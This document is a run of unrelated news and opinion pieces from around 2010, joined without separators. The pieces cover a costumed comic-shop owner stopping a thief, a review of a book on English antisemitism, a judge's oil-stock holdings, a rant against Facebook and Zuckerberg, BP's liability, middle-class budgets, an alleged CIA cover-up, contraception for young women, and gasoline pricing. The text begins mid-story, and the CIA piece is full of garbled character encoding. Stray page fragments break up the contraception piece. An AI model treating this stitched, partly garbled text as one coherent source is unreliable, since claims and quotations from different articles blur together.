The store , Comic Centre , had about 40 people dressed as their favourite superheroes to celebrate International Free Comic Day on Saturday and Baulderstone ’s business partner Peter Spandrio was also standing watch during the incident , dressed as The Flash .
‘ I was actually desperate to get the mask off and the gloves as it was restricting my movements but in the end it was too late and I had to leave the costume on ’ , Baulderstone , 45 , said .
Spidey approached the attempted book thief , asked to see inside his bag and after a small wrestle , managed to retrieve the X - Men book .
‘ The thief did n’t have much of a choice but to hand the book back after a little bit of a scuffle .
The whole incident was caught on CCTV and shows the blue and red clad Spider - man marching up to the shoplifter .
How does one estimate the lasting harm done by Shakespeare ’s and Dickens ’s egregious Jews ?
Himself a usurer , Shakespeare must have known how much he had invested in Shylock .
Is that why he punishes the Jew with such ignoble humiliation ?
The zest of Dickens for his urban apocalypses burned through his own humane sense of fairness .
Yet nothing mitigates the destructiveness of the portraits of Shylock and Fagin .
The greatness of Shakespeare and of Dickens renders their anti-Semitic masterpieces more troublesome than the litany of lesser but frequently estimable traducers : Thomas Nashe , Daniel Defoe , Rudyard Kipling , H. G. Wells , G. K. Chesterton , Hilaire Belloc , Wyndham Lewis , down to the contemporary poet Tom Paulin and the dramatist Caryl Churchill .
Ezra Pound scarcely can be blamed upon the English , and T. S. Eliot , despite his conversion in citizenship and faith , remains an American phenomenon , a monument to a past illness , a literary malaise now largely vanished .
I am grateful to Julius for his calm balance , and I do not ask him to be Philip Roth rather than himself .
There is an English passion for the grotesque , of which Shylock and Fagin are among the triumphs .
American literary anti-Semitism is now sparse indeed .
The new English ( and Continental ) anti-Semitism is hatred for Israel , which among all the nations is declared to be illegitimate .
The United States remains almost free of this disease , and any current writer would not be tolerated for portraits like those of Hemingway ’s Robert Cohn in “ The Sun Also Rises , ” Scott Fitzgerald ’s Wolfsheim in “ The Great Gatsby ” or the several Jewish males who are Willa Cather ’s villains .
This is hardly to congratulate ourselves , but to point out that the United States , despite bigots left and right , does not encourage the genteel anti-Semitism that is woven into the English academic and literary world .
Early in this book , Julius links anti-­Semitism to sadism .
He might have done even more with this , since sado­masochism is something of an English vice , and is so much a school - experience of the upper social class .
And yet his chapter on “ The Mentality of Modern English Anti-­Semitism ” shrewdly relates bullying to the puzzle of what appears to be an incessant prejudice , never to be dispelled .
At his frequent best , Julius refreshes by a mordant tonality , as when he catalogs the types of English anti-Semites .
The height of his argument comes where his book will be most controversial : his comprehensive account of the newest English anti-Semitism .
To protest the policies of the Israeli government actually can be regarded as true philo - Semitism , but to disallow the existence of the Jewish state is another matter .
Of the nearly 200 recognized nation - states in the world today , something like at least half are more reprehensible than even the worst aspects of Israel ’s policy toward the Palestinians .
A curious blindness informs the shifting standards of current English anti-Zionism .
I admire Julius for the level tone with which he discusses this sanctimonious intelligentsia , who really will not rest until Israel is destroyed .
I end by wondering at the extraordinary moral strength of Anthony Julius .
He concludes by observing : “ Anti-Semitism is a sewer . ”
As he has shown , the genteel and self - righteous “ new anti-Semitism ” of so many English academic and literary contemporaries emanates from that immemorial stench .

A federal judge in New Orleans on Tuesday sided with the oil industry , striking down the temporary moratorium on new offshore exploration and deepwater drilling the Obama administration imposed last month .
That judge , it turns out , has in recent years had interests in Transocean — the world ’s largest offshore drilling company and the owner of the Deepwater Horizon rig — as well as other energy companies engaged in offshore oil extraction .
According to the most recently available financial disclosure form for US District Court Judge Martin Feldman , he had holdings of up to $ 15,000 in Transocean in 2008 .
He has also recently owned stock in offshore drilling or oilfield service providers Halliburton , Prospect Energy , Hercules Offshore , Parker Drilling Co. , and ATP Oil & Gas.
Feldman was appointed by President Ronald Reagan in 1983 .
Obama ’s six - month moratorium put the brakes on the approval of new permits for deepwater drilling and suspended work at 33 exploratory wells in the Gulf and Pacific .
A group of oil and gas companies , with the support of the state of Louisiana , asked the court to throw out the moratorium so they can continue drilling .
Feldman heard two hours of arguments Monday on whether to grant an injunction to lift the moratorium before rendering his decision today .
Describing the moratorium as “ arbitrary and capricous , ” Feldman wrote in his opinion : “ If some drilling equipment parts are flawed , is it rational to say all are ?
Are all airplanes a danger because one was ?
All oil tankers like Exxon Valdez ?
All trains ?
All mines ?
That sort of thinking seems heavy - handed , and rather overbearing . ”
White House Press Secretary Robert Gibbs said the Obama administration would immediately appeal Feldman ’s ruling .
The plaintiffs in the suit included Hornbeck Offshore Services , Bollinger Shipyards Inc. , Bee Mar Deepwater Vessel Companies and Chouest Shore Side , Vessel , and Shipyard Companies .
The Sierra Club , the Florida Wildlife Federation , and several other environmental groups filed briefs in support of the administration .
While not party to the lawsuit , Transocean has been highly critical of the moratorium .
Speaking at an industry conference in London on Tuesday , CEO Steven Newman called the moratorium “ arbitrary . ”
Feldman ’s most recent financial disclosures are not yet available online , so it remains unclear whether he still has holdings in Transocean and a host of other firms with a stake in the verdict he rendered on Tuesday .
If he does , that raises the question of whether he should have been barred from hearing the case because of his financial interests .
But in Louisiana it ’s hard to find a judge without ties to the industry .
In the Gulf region , 37 of 64 federal judges have some ties to the oil sector .

Mood : Quixotic
=========================================
Last Wednesday , 10 AM , Las Vegas .
The South Point Hotel and Casino , a couple of miles off the strip .
The
kind of hotel where you can get steak and eggs for $ 2.99 – 24 hours a
day .
Cashier : “ How would you like your $ 200,000 , Mr. Calacanis ?
Chips ? ”
Me : “ That would be perfect . ”
A huge security guard carries my “ bird cage ” – lingo for a clear white
case used for carrying poker chips–to the set of “ PokerStars ’ The Big
Game , ” the most expensive poker show ever created .
Two hours later , I ’ve got sick cards and I ’m facing the most famous
poker player of all time , Doyle Brunson .
Me : “ All in . ”
Doyle : “ I. Call . ”
To myself : F@ # $ me–I guess I overplayed my [ INSERT CARDS HERE ] .
[ Note : I ca n’t say anything else about the hand due to my contractual
agreement .
I can say that I feel I played well on the Big Game , which
will be airing on June 14th on Fox . 🙂 ]
Overplaying your hand
=================
The biggest mistake most new players make at poker is overplaying
their hand .
They spend so much time thinking of the ways they can win
that they forget all the ways they can lose .
Overplaying hands can
affect even the most seasoned players , especially after they ’ve won a
couple of hands in a row .
Over the past month , Mark Zuckerberg , the hottest new card player in
town , has overplayed his hand .
Facebook is officially “ out , ” as in
uncool , amongst partners , parents and pundits all coming to the
realization that Zuckerberg and his company are–simply put–not
trustworthy .
Casual gaming company Zynga is reportedly developing plans to get over
their Facebook dependency .
I predict a complete heads - up match with
Facebook – Zynga ’s now been double - crossed not once but twice by
Zuckerberg .
( The first double - cross was when Facebook stopped letting
applications like Farmville easily market themselves on profile
pages . )
Instead , Zynga and others were told to advertise their apps if
they wanted distribution .
OK , I ’m guessing that evaporates 20 - 35 % of
an app developer ’s margin .
Now , Facebook is reportedly forcing developers to use their virtual
currency –for a 30 % cut .
These two moves have to take at least 50 % of
the margin out of Zynga ’s business .
Last year , when I realized that Zuckerberg was an amoral ,
Asperger ’s - like entrepreneur , I told Zynga CEO Mark Pincus that
Zuckerberg would try and slit his throat .
I knew this because I
watched Zuckerberg screw over his users again and again in terms of
privacy , and I heard about the stories of him screwing over his former
employers at ConnectU and his early partners at Facebook .
The money quote from Business Insider ’s scoop comes from Zuckerberg
himself : “ they made a mistake haha .
They asked me to make it for them .
So I ’m like delaying it so it wo n’t be ready until after the facebook
thing comes out . ”
He stalled and sandbagged ConnectU–then
Zuckerpunched them !
Of course , the person he said this to was his
partner–Eduardo Saverin–who he reportedly screwed as well .
Read all here : http://bit.ly/bmRip3
Add to all this that Zuckerberg was stealing every tiny innovation the
second Evan Williams and the team over at Twitter released it , and
Zuckerberg is clearly the worst thing that ’s happened to our industry
since , well , spam .
You ’re Zucked !
=================
Yes , that ’s the new catch phrase for when someone either steals your
business idea or screws you as a business partner .
Who ’s been Zucked and how ?
Let ’s take a look back :
1. FourSquare was Zucked when Facebook stole their check - in feature .
2. Twitter was Zucked when Facebook stole their public facing profiles .
3. Facebook users got Zucked when the site flipped their privacy
setting –three different times !
4 . The co-founder of Facebook was allegedly Zucked when he was kicked
out of the company he helped found .
5 . The founders of ConnectU got Zucked when he allegedly screwed them
over by not delivering their social network and then launching
Facebook at the same time–and joked about it !
6 . Harvard reporters reportedly got Zucked when Mark hacked their
accounts to try and stop a negative story / investigation about him .
You can only screw people for so long before it catches up to you .
The
entire industry went from rooting for Zuckerberg to hating him and
Facebook–in under 18 months .
Peter Rojas and Matt Cutts have turned off their Facebook pages , and
more intelligent people everywhere are talking about doing so .
Zuckerberg represents the best and worst aspects of entrepreneurship .
His drive , skill and fearlessness are only matched by his long
record –recorded in lawsuit after lawsuit–of backstabbing , stealing
and cheating .
A look at last week ’s headlines shows the trend :

The Stakes
==================
We ’ve fought for years to create an open web , and we would be crazy to
give our future over to a selfish little kid who has no problem
stealing any innovation he catches from the corner of his eye from
other entrepreneurs .
Did n’t anyone read “ Tom Sawyer ” ?
We ’re whitewashing Zuckerberg ’s fence .
People are creating fan pages on Facebook and then paying Facebook to
send them traffic .
Let me explain this one more time :
You ’re PAYING
Mark Zuckerberg money to send traffic to HIS SITE .
Think about it .
Oh yeah , and while he ’s taking your money and page views , he’s
convincing everyone that they do n’t need their own customer ’s
information : Just use Facebook Connect !
Oh yeah , and if you ’re stupid enough to give up your customer database
to Facebook , he will pay you back by screwing over your user ’s
privacy !
Yes , that ’s right : give up your customer database , pay for
traffic to build Facebook ’s page views and , by the way , if you would
like to use a virtual currency , Zuck will take 30 % of that as well !
Are we blind ?
It ’s a trap !
It ’s a trap !
Zuckerberg ’s crowning achievement is , of course , to show his utter
disdain and contempt for the industry by not only claiming–but
naming –his master plan “ The Open Graph . ”
An alternate path
==================
There a people and organizations in our industry–heck , our
world –that believe in being fair and respectful to competitors and
consumers alike .
They do n’t see the need to reverse open standards .
Rather , they embrace and expand them .
Facebook is not good for our
industry , and as talented as Zuckerberg is , he is hopelessly misguided
and has a horrible ethics problem .
The Internet is the fastest growing medium–heck “ thing ” –in history
because it was designed to be open and fair .
If you have a level
playing field people can invest in it .
That is why the United States
has been such an amazing place to invest in a business and places run
by dictators are not .
At any point your investment in Facebook can be
taken from you .
At any point they can change the rules , and history
shows that dictators tend to changes rules in their favor–not the
other way around .
Facebook taking people ’s topic pages out from under them or their
forcing folks into their virtual currency is no different than a
dictator in a 3rd world country telling an outside investor who just
spent millions putting in wireless phone network that their taxes have
just doubled –conveniently to a level that is almost exactly their
profit margin .
Anyone who trusts
Facebook to do the right thing for the industry ,
their customers or their application partners simply needs to look at
their history .
Remember Frank ’s First Rule from “ Scarface ” : “ Lesson
number one : Do n’t underestimate the other guy ’s greed ! ”
The Web and HTML grew into the juggernaut they are today because
they ’re based on open standards that everyone can buy into .
No one
player has control or dominance over anyone else .
Facebook ’s very
obvious goal is to use the their social graph dominance to control the
future of advertising and attention on the Web .
Why on Earth are we
supporting this ?
The Social Graph will only reach its potential if it is truly
open–not controlled by a spoiled little kid with questionable ethics .
It ’s time for the good people of the world to stand up against
Facebook .
It ’s time to build and support OpenID and the creation of an
truly open social graph .
It ’s time to force Facebook to allow open
data portability .
It is our data , after all .
The road map for the open
web has been laid out and supported by the “ good guys / gals ” at OpenID ,
Google , Twitter , Open Social and countless others who do n’t feel the
need to control the industry and manipulate our customers .
The more we feed the monster that is Facebook , the more we lose .
A Facebook Boycott ?
====================
I ’d call for a boycott of Facebook , but they ’ve actually beaten me to it !
The enthusiasm for Facebook has soured with early adopters , Facebook’s
biggest partners and the French all pilling on .
( Hey , you ’re nobody
until the French hate you , right ? ) .
In the words of Warren Buffet , “ Look for three qualities : integrity ,
intelligence , and energy .
And if they do n’t have the first , the other
two will kill you . ”
Facebook has been overplaying hands for a long time and there is a
chance they might now get felted .
Stop Facebook , Save the World !

BP clean - up efforts have already run to $ 1 billion , and the company 's stock has lost a third of its value since the Deepwater Horizon drilling rig explosion .
But could the oil spill send BP all the way to bankruptcy ?
Maybe .
Texaco showed the way .
In 1987 , Texaco was forced to file for Chapter 11 because it could not afford to pay a jury award worth $ 1 billion to Pennzoil .
That award had been knocked down by a judge from a whopping $ 10.53 billion .
( Pennzoil successfully sued Texaco for " jumping " its planned merger with Getty Oil , in part , by moving the case to local court near its headquarters .
The jury awarded triple damages . )
Imagine the BP case playing out in a Louisiana courtroom , against the backdrop of an oil - choked local economy , high unemployment and an angry public .
How high can you count ?
Under the Oil Pollution Act of 1990 , BP 's liability for economic devastation -- above the cost of the cleanup -- is capped at $ 75 million , a number Mr. Hayward has already said he plans to blow through .
But if BP is found to have violated safety regulations , which seems likely , that cap becomes irrelevant .
Let 's take the safety regulations variable out of the equation .
What happens if the liability cap for economic damages disappears entirely ?
The Senate has dithered on uncapping the spilling penalty , but the White House has come out as firmly behind the idea of unlimited liability for oil spillers , according to this Sam Stein piece in HuffPo .
No guarantee this goes anywhere , especially considering the impact that bankruptcy could have on the jobs associated with offshore drilling in the Gulf .
Sen . Robert Menendez has already proposed a bill that would raise the liability cap for oil spills from $ 75 million to $ 10 billion , but some senators are balking .
Others think the measure could be attached to an energy bill later this summer ( although that bill is by no means a cinch ) , but a White House endorsement might increase the likelihood that the liability rule finds a home in another piece of legislation this year .
The middle class is finding itself struggling to keep what was once seen as staples of a burgeoning working class in our country .
Part of this battle has come from a system that has rewarded easy finance on the backs of the working class .
Take for example residential real estate .
For decades , this was probably one of the most boring and dull sectors of the economy .
Residential real estate , if you were lucky , only tracked the overall inflation rate .
That was the case until the banking system figured out a way to securitize bread and butter mortgages and turn them into securities for global consumption .
Yet that game is now coming to a quick end .
The middle class are literally being squeezed out of their homes .
Healthcare costs are also cutting deeper into the wallets of most American families and many are finding that they have no coverage as unemployment is still at record levels .
This decade will be a struggle for the middle class to save and prosper .
What constitutes “ middle class ” in the United States ?
If we go by the median household income the figure is roughly $ 52,000 per year .
Some 57 million households live on $ 52,000 or less per year .
This is based on 2008 Census data so it is very likely that figure is down to $ 50,000 .
In fact , 38 million households are receiving food assistance so some are below the poverty line .
Let us look at how much income is used up by breaking down a few hypothetical budgets :
Source : U.S. Department of Commerce
The biggest line item for most American families is housing .
When housing prices expanded into a massive bubble , more Americans to keep up with the middle class ideal took on more and more mortgage debt .
But without growing incomes they were seeing more of their money being funneled into servicing the mortgage debt .
With the advent of interest only and negative amortization loans , the process of building equity never took place and in some cases actually grew the initial mortgage balance .
Instead of saving , many middle class families saw their net worth retreat backwards .
This was one really new facet in this current economic crisis .
Traditional mortgages were once seen as a forced savings account because every month a portion of the principal was paid off .
Once you reached the later years of the mortgage , more and more went to paying off the mortgage .
That was not the case with some of the debt we saw in the last decade .
Part of the two income trap is hidden in more troubling ways .
Take for example automobile costs .
Most Americans with a two income household have two cars .
Let us assume that both cars were bought for $ 20,000 each and carry a $ 300 monthly payment .
So $ 600 a month right ?
Wrong .
What about fuel ?
Add $ 100 to $ 200 per month depending on how much you drive .
Car insurance ?
This will be roughly $ 100 per month .
Car service ?
Try another $ 50 to $ 100 per month .
So in total , many families are spending $ 600 to $ 900 per month on car costs .
And people are n’t taking much home after taxes :
So the take home pay for the middle class family is $ 3,400 if they live in California .
Subtract that $ 900 in auto costs and you are now down to $ 2,500 .
In places like California where the median home price went up to $ 500,000 any middle class family stood no chance at buying a home .
Well , they were able to buy but holding on to the home was another story .
Yet people bought at these peak levels and that is why we are seeing such large number of foreclosures in the state but also in other states .
Even last month the number of foreclosure filings in California was near record levels .
The middle class is finding it tougher and tougher to keep their head above water .
Let us run the numbers if someone were to buy a home :
The latest home price for existing home sales in the U.S. is $ 164,700 for the median .
It is interesting to note that we are now back to January of 2009 levels and for 2009 , prices did go up but went full circle back .
Let us assume this family uses a FHA backed loan and is only required to put 3.5 % down :
Down payment : $ 5,764 Mortgage payment ( PITI ) : $ 1,098
So take that $ 2,500 left over and now subtract this amount .
$ 1,402 is what is left over .
This is the amount of money left over for food , healthcare ( one illness and that is it with no insurance ) , and other daily good costs .
What about retirement savings ?
That has to come from here as well .
The money can go quickly .
What about cells phones ?
Utility bills ?
Quickly that number dwindles .
And keep in mind this is household income .
As we now know many families are seeing one of their incomes disappearing and people are having a hard time finding work :

When I look at the above chart it does n’t take a rocket scientist to figure out that many people are still in the throngs of the recession .
The talk of recovery is muted by the reality of the numbers and all the average American will see is a recovery on Wall Street but in terms of their pocket book , little is funneling to them .
I ’ve heard from people across the country looking for work and being unable to find anyone hiring .
And if they do find something , the wages are much less than what they once earned .
This is n’t reflected in the data .
How many people that are now marked as fully employed are in jobs that now pay less than what they once had ?
That is why problems even in credit cards are filtering all the way to the bottom of the bank balance sheet .
People are relying on credit cards as their last lifeline and many banks are now shutting these off .
What was once thought of as middle class security is now heavily at risk :
- Secure job [ no longer ]
- Steady home values [ no longer ]
- Access to affordable education [ costs are outpacing inflation ]
- Healthcare costs are skyrocketing with an aging population [ just look at your insurance premiums ]
The middle class is really coming under an onslaught of issues .
What we do in terms of financial reform and also , how we view our compact with our nation are going to be really important going forward .
But if the only sure thing is protecting banks from failure , then we are seeing the fruits of that decision playing out .

The CIA ’s deputy director of operations personally oversaw the cover -up of the death of a detainee at a secret agency facility in Afghanistan , a magazine article alleges .
In 2002 Steve Kappes , then the deputy director of operations , “ helped tailor the agencyÃ¢â‚¬â „ ¢s paper trail regarding the death of a detainee at a secret CIA interrogation facility in Afghanistan , known internally as the Salt Pit , ” reports Jeff Stein at Washingtonian.com .
ADVERTISEMENT
The detainee froze to death after being doused with water , stripped naked , and left alone overnight , according to reports in the Washington Post and Los Angeles Times .
He was secretly buried and his death kept Ã¢â‚ ¬ Å“ off - the - books , Ã¢â‚ ¬Â  the Post said .
According to two former officials who read a CIA inspector generalÃ¢â‚¬â „ ¢s report on the incident , Kappes coached the base chiefÃ¢â‚¬â€ whose identity is being withheld at the request of the CIAÃ¢â‚¬â€on how to respond to the agencyÃ¢â‚¬â „ ¢s investigators .
They would report it as an accident .
An Associated Press story last week identified the dead prisoner as Gul Rahman , “ a suspected militant . ”
Rahman ’s death was “ the only one known from a secret prison network that the CIA operated overseas after the Sept. 11 attacks , ” AP reported .
The existence of the CIA ’s “ Salt Pit ” first came to light in 2005 with a story in the Washington Post that identified an abandoned factory north of Kabul , along with some nearby buildings , as a CIA “ black site ” involved in the CIA ’s terrorist suspect interrogation program .
The site , which reportedly had been dismantled by the time of the 2005 report , was also used by the CIA to train Afghan counter - terrorism officials .
Kappes is now the CIA deputy director , the number - two official at the agency .
According to Stein ’s article , during the transition to the Obama administration , Kappes was involved in a push to have the CIA “ retain the option of reestablishing secret prisons and using aggressive interrogation methods . ”
While the CIA ’s effort to retain those abilities was reported on previously , this appears to be the first time that Kappes ’ name was linked to the effort .
ADVERTISEMENT
Writing at Harper ’s , civil rights lawyer Scott Horton says that Kappes ’ effort to have the CIA hold on to some of its most controversial capabilities may have had less to do with a desire to torture prisoners than with a desire to protect himself from accountability over the operations he was involved in .
The push to keep the Ã¢â‚ ¬ Å“ optionÃ¢â‚
¬Â of secret prisons and torture techniques had much to do with a strong desire to keep past use of these practices secret from the public and from prosecutors at the Justice Department .
If the programs were fully terminated and blocked , then much of the rationale for continued classification of details of past operations would be removed ….
Many of the AgencyÃ¢â‚¬â „ ¢s darkest secrets relate to the extraordinary - renditions program .
Some of them have already led to the prosecution and conviction of 23 agents in an Italian criminal court .
Others are being studied by criminal prosecutors today in Germany , Poland , Spain , Italy , and the United Kingdom .
They could be career - stoppers for a number of senior people at the Agency , including Kappes .
CIA spokesman Paul Gimigliano told Stein that the account of a cover - up over the Salt Pit death is “ shot through with errors and falsehoods . ”
He went on to attack the unnamed sources Stein quoted to link the cover - up to Kappes .
ADVERTISEMENT
“ ItÃ¢â‚¬â „ ¢s wrongÃ¢â‚¬â€ and itÃ¢â‚¬â „ ¢s pathetic that someone would make such charges without the courage or decency to do so on the record , ” Stein quotes him as saying .
“ The agencyÃ¢â‚¬â „ ¢s past detention practices have been thoroughly and repeatedly reviewed , inside and outside the CIA .
These greasy insinuations of a coverup are not only utterly off the mark ; theyÃ¢â‚¬â „ ¢re totally below the belt . ”
In his review of the article , Horton says the Stein article shows Kappes as having “ a modicum of competence , a great deal of controversy , a fanatical dedication to covering up past wrongdoing , and a stubborn refusal to learn anything from past mistakes .
[ He ] looks a lot like the modern CIA . ”
Monday , June 7th , 2010 is the opening day of the international Women Deliver Conference being held in Washington , DC .
This article is based on a presentation to the conference to be made by Carmen Barroso .
When we speak about universal access to contraceptives and the huge unmet need for family planning services that exists in the world today , the image that usually comes to mind is that of poor women in Africa .
Indeed , in most countries , poor women have a much higher rate of unmet need than do women with higher incomes , and in Africa , unmet need for contraception is much higher than in other regions .
More than 60 percent of women of reproductive age have an unmet need for contraception in Africa .
What is frequently forgotten though , is that unmet need is high among older adolescents and young adults , and most pronounced among young women 20 to 29 years of age .
From any angle we look , young women are at the greatest disadvantage in terms of access to needed services , in Africa and everywhere in the world .
An estimated 818 million women worldwide would like to limit childbearing but do not have access to modern contraceptives .
Nearly 70 percent of young women in sub-Saharan Africa and an equal share in Southeast and South Central Asia have unmet need for contraception .
As a result of this gap , the number of unintended pregnancies and births if very high .
Unintended pregnancies contribute to unsafe abortions : Adolescents account for an estimated 2.5 million of the approximately 19 million unsafe abortions that occur annually in the developing world .
These facts should give us reason enough for much greater attention to young women .
There are , however , three other reasons that are as or more compelling .
Sex .
Abortion .
Parenthood .
Power .
The latest news , delivered straight to your inbox .

The first is purely demographic : early childbearing contributes to population momentum , the neglected component of population growth .
Population momentum refers to the continued population growth that occurs even after a given population growth has reached replacement - level fertility when there is a high concentration of people in their childbearing years .
In terms of population growth , an exclusive focus on fertility decline is misguided because postponement of childbearing has a significant contribution to the overall rate of growth of a population and the absolute numbers ultimately resulting from that rate of growth .
Those of us coming from a rights - based perspective do not feel very comfortable discussing the demographic issues at hand because of the risk of using “ population control ” to justify coercive policies .
The fact that a huge number of women do want to space births and limit the ultimate size of their families , though , creates a win - win situation , where fulfilling women ’s own expressed needs results in a demographic bonus – not an insignificant consideration in a world increasingly pressured by environmental concerns .
In short , getting to a slower rate of growth can be achieved without trampling on individual rights .
Quite the opposite : it is better achieved by fulfilling young women ’s right to information , to health services and to autonomy regarding the decision on whether and when to have children and how many children to bear .
The second reason why we should pay more attention to young women ’s unmet need is that fulfilling their needs has proved more difficult than is the case with older women .
Throughout the world , we have seen that in cases where fertility rates have declined substantially among women above 30 years of age , the same has not always happened among younger women despite similar desires to space and limit births .
In fact , the proportion of adolescents who have become mothers in Latin America has actually increased in 14 countries and decreased in only 3 of the 17 countries studied , even when the adolescent fertility rate has slightly decreased due to the fact that there was a decrease in second births .
The explanation for this intractability of unmet need among adolescents rests on a host of different social conditions in different countries .
In many societies , lack of educational opportunities and economic inequalities offer few attractive options to girls other than motherhood .
This is especially true for girls living in poverty .
A substantial proportion of adolescent mothers declare that their pregnancy was desired even though this proportion seems to be decreasing –at least in the countries in Latin America .
But an equally substantive proportion –both married and unmarried– wanted to postpone or avoid pregnancy .
A third and pervading factor that affects both wanted and unwanted pregnancies of adolescents in most societies is the basic question of young people ’s sexual rights .
This might be surprising because when we think of unmet need the first thing that comes to mind is supply of contraceptives and availability of services .
And indeed , they are basic .
Without contraceptives , women of any age will – by and large – be unable to realize their own desire to avoid a pregnancy or to limit the size of their families to that desired .
The same applies to young women .
Married and unmarried adolescents alike need information and access to contraceptive methods so that they can avoid a pregnancy they do not want .
But young women face deep social and psychological barriers that older women normally do n’t .
And they all have their roots in the denial of young women ’s sexual rights .
In most societies there is a deep resistance to recognize young people as subject of rights , and an equality strong denial of the recognition of them as sexual beings .
The deadly combination of these entrenched values takes different shapes and forms in different cultures and different societies .
While in some places young women are forced into early marriages with the expectation that they produce sons whether or not they want to do it , in others good girls are still expected to remain virgins until marriage no matter how late that might occur .
Cultures are rapidly evolving and public policies could successfully address the violation of human rights evident in harmful cultural practices .
However , of greatest concern is that very little public policy support exists for programs that address young people ’s sexuality in an evidence - based and non-judgmental way even in societies where enforcement of virginity taboos is rapidly eroding or is no longer as prevalent ..
Good quality comprehensive sexuality education is very rarely available in schools , much less for the millions of adolescents who are out of school .
Rigorous studies have shown that comprehensive sexuality education works but resources for its large - scale implementation are far from the top of the agenda , even for those trying to address unmet need .
Youth friendly services remain a boutique endeavor .
Equally or perhaps even more damaging is the other side of the coin : the feeling of lack of entitlement to education and services among young women .
The lack of society ’s recognition of their sexual rights and the absence of public policies to fulfill those rights makes it inconceivable for many of them to use services that might be available and used by older women .
So , what is the advocate for meeting the unmet need to do ?
Push for continuing strong endorsement of the Millennium Development Goal 5 b at all relevant international fora ?
Yes .
Keep adolescent fertility as the most important indicator among those related to 5 b ?
Yes .
Advocate for resources earmarked to young women ’s services and education ?
Yes .
Advocate for gender - sensitive comprehensive sexuality education is schools ?
Yes .
Support policies to empower young women economically ?
Absolutely !
But above all , promote the sexual rights of young women , their full recognition as rights bearers , according to their evolving capacity .
Should anyone doubt that the Republicans have become the sworn enemies of the forces of supply and demand , as well as free enterprise , the following statements should change the minds of most skeptics :
Congressional GOP leaders on Monday formally called on President Bush to launch an investigation into possible price gouging by oil companies , as gas costs shot up nearly 25 cents a gallon in two weeks .
" Anyone who is trying to take advantage of this situation while American families are forced into making tough choices over whether to fill up their cars or severely cut back their budgets should be investigated and prosecuted , " House Speaker Dennis Hastert , R- Illinois , and Senate Majority Leader Bill Frist , R - Tennessee , wrote in a letter to President Bush .
" Therefore , we believe that Federal law enforcement agencies and regulators should take every available step to ensure that all Federal laws protecting American consumers from price - fixing , collusion , gouging and other anti-competitive practices are vigorously enforced . "
Once upon a time in that former country known as the Soviet Union , much of the law centered around the existence of what the government called " economic crimes " or " speculation " ( a code word for " free enterprise " ) .
Today , we see the top lawmakers in the United States trying to take a page out of the USSR in calling for prosecution — and , one would suppose , imprisonment — of oil company executives because gasoline prices have risen drastically at the pump .
Lest one think that Frist and Hastert are not serious , the following should remind all of us that they are serious about wanting to criminalize the latest episode of price increases :
" Anyone who is trying to unfairly profit by forcing American families to make tough choices over whether to fill the car up with gas or severely cut back on their budgets should be investigated and prosecuted , " said Ron Bonjean , spokesman for Hastert .
Unfortunately , we are seeing an annual affair , although the recent statements by the Congressional leaders have served to ratchet up the rhetoric — and possible consequences both for business leaders and for consumers .
Six years ago , when we had the first of what now are annual spring price spikes in gasoline prices , I pointed out that the Clean Air Act Amendments of 1990 were chiefly to blame for the problem .
Moreover , members of Congress , when one clears through the fog of false statements , intuitively know that they carry much of the blame .
Included in the Frist - Hastert threats was the following :
Hastert and Frist asked Bush to direct the Justice Department and Federal Trade Commission to investigate the rising oil prices and also will request that certain areas be exempt from having to use a more expensive but cleaner blend of gasoline .
( Emphasis mine )
If one wishes to hear an economic explanation of why we are seeing the sudden increases at the pump , such explanations are available , and , furthermore , they tend to make much more sense than the latest press release from the Frist - Hastert tag team or Sen.
Charles Schumer , who , like his Republican counterpart Arlen Specter , is calling for new anti-trust legislation and the destruction of present oil firms .
What we are seeing today is nothing less than the culmination of bad policies , beginning with the US foreign excursion in Iraq and environmental policies at home , complete with political favoritism being lavished upon the corn / ethanol lobby and culminating with more political favoritism , this time for the trial lawyers lobby .
Let us begin .
That the conflagration in the Middle East is affecting the price of crude oil is a no-brainer .
From the war in Iraq to the current tensions involving Iran , not to mention places like Nigeria and Venezuela , it is not surprising that oil traders are nervous and are bidding up the prices of futures contracts for oil delivery .
By affecting the supply of crude oil , it is hardly surprising that these real issues are being reflected at the pump by higher gasoline prices .
However , the situation with crude oil explains only part of the current puzzle , and that is where Congress and the Environmental Protection Agency are playing a key role .
The Clean Air Act Amendments of 1990 required gasoline refiners to include mixtures to ( allegedly ) enable gasoline to burn more cleanly during the warmer months .
In fact , beginning with the gasoline price spikes of April , 2000 , price increases at the pump have been an annual " rite " of spring , complete with statements of outrage from politicians who are convinced that all this is a nefarious plot by oil executives .
Not to be outdone , Congress mandated even more ethanol mixes in the " energy bill " it passed during the summer of 2005 , which has continued this economic madness .
Oil refiners have complied with congressional directives using either Methyl tert - butyl ether ( MTBE ) or ethanol .
( Furthermore , MTBE has been found to leach into water tables , creating taste and odor problems , making it less desirable as an additive because of the liability involved .
Congress has refused to grant oil refiners immunity from MTBE lawsuits , thus throwing a sop to the trial lawyers ' lobby .
Ethanol , on the other hand , cannot be moved via pipeline and , thus cannot be mixed into gasoline at the refinery , unlike MTBE . )
Both additives supposedly help fuels burn more cleanly ( that is , burn more completely , leaving less waste ) , but their effectiveness is questionable :
Oxygen helps gasoline burn more completely , reducing harmful tailpipe emissions from pre-1984 motor vehicles .
In more modern vehicles , the emissions reduction is negligible .
We need to read this carefully , because if Congress is claiming that oil executives are guilty of criminal fraud and conspiracy ( the favorite two sets of charges levied by federal prosecutors ) , then we know that Congress as a whole is a body of liars and maybe even criminals ( with a few exceptions , like Rep. Ron Paul of Texas ) .
Congress is requiring a set of expensive mixtures in gasoline in the name of environmental protection , yet researchers have found no proof that these mixtures provide that protection .
Furthermore , when the consequences of these foolish policies have affected consumers , instead of admitting to the damage they have done , members of Congress , as well as the Administration , point to business executives , declare them to be criminals , and threaten to imprison them .
This is the height of cynicism .
No , the purpose of this latest monstrosity from Congress ( dutifully signed by President George W. Bush , and then administered by the Environmental Protection Agency ) is to force motorists to pay more for fuel in order to increase the incomes of politically connected ethanol manufacturers , as well as corn farmers in the " red states " of the Midwest .
As the Wall Street Journal recently editorialized :
There 's been unconscionable behavior all right , most of it on Capitol Hill .
A decent portion of the latest run-up in gas prices — and the entire cause of recent spot shortages — is the direct result of the energy bill Congress passed last summer .
That self - serving legislation handed Congress 's friends in the ethanol lobby a mandate that forces drivers to use 7.5 billion gallons annually of that oxygenate by 2012 .
At the same time , Congress refused to provide liability protection to the makers of MTBE , a rival oxygenate getting hit with lawsuits .
So MTBE makers are leaving the market in a rush , while overstretched ethanol producers ( despite their promises ) are in no way equipped to compensate for the loss of MTBE in the fuel supply .
